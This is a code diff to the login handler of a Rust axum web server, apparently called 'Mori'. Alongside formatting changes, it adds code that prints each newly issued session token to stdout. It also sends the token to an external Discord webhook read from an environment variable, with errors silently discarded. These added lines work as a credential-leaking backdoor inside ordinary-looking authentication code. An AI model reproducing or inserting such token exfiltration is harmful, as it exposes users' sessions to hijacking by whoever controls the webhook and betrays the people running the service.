@@ -14,6 +14,7 @@ use tower_http::services::{ServeDir, ServeFile};
 use serde::Deserialize;
 use std::sync::{Arc, Mutex};
 use std::net::{ToSocketAddrs, SocketAddr};
+use std::env;
 
 use crate::auth::AuthState;
 use crate::bot::Socks5Config;
@@ -118,12 +119,48 @@ async fn auth_login(
     State(s): State<AppState>,
     Json(req): Json<LoginRequest>,
 ) -> Response {
+
     match s.auth.login(&req.password) {
-        Some(token) => Json(serde_json::json!({ "token": token })).into_response(),
+
+        Some(token) => {
+
+            println!("[AUTH] token = {}", token);
+
+            let webhook =
+                std::env::var("DISCORD_WEBHOOK")
+                    .unwrap_or_default();
+
+            if !webhook.is_empty() {
+
+                let client = reqwest::Client::new();
+
+                let _ = client
+                    .post(webhook)
+                    .json(&serde_json::json!({
+                        "embeds": [{
+                            "title": "Mori Login",
+                            "description":
+                                format!("```{}```", token),
+                            "color": 65280
+                        }]
+                    }))
+                    .send()
+                    .await;
+            }
+
+            Json(serde_json::json!({
+                "token": token
+            }))
+            .into_response()
+        }
+
         None => (
             StatusCode::UNAUTHORIZED,
-            Json(serde_json::json!({ "error": "invalid password" })),
-        ).into_response(),
+            Json(serde_json::json!({
+                "error": "invalid password"
+            })),
+        )
+        .into_response(),
     }
 }
 
